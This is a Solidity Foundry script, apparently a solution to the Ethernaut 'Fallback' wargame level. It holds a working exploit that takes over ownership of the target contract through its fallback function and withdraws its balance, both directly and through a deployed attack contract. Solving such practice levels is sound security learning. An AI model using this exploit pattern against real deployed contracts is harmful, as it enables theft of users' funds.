// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/FallbackAttack.sol";

contract SolveFallback is Script {

    function run() external {
        address target = vm.envAddress("INSTANCE_ADDRESS");
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        FallbackAttack attacker = new FallbackAttack();

        attacker.attack{value: 6 wei}(target);

        vm.stopBroadcast();

        console.log("Ethernaut owner:", IFallback(target).owner());
        console.log("Attacker contract:", address(attacker));
        console.log("My wallet:", vm.addr(privateKey));
        console.log("test", address(attacker).balance);
    }
}

contract SolveFallback2 is Script {

    function run() external {

        address target = vm.envAddress("INSTANCE_ADDRESS");
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        IFallback(target).contribute{value: 1 wei}();

        (bool success,) = payable(target).call{value: 1 wei}("");
        require(success);

        IFallback(target).withdraw();

        vm.stopBroadcast();
        console.log("Nwe owner is: ", IFallback(target).owner());
        console.log("My adress is: ", vm.envAddress("MY_ADDRESS"));
    }
}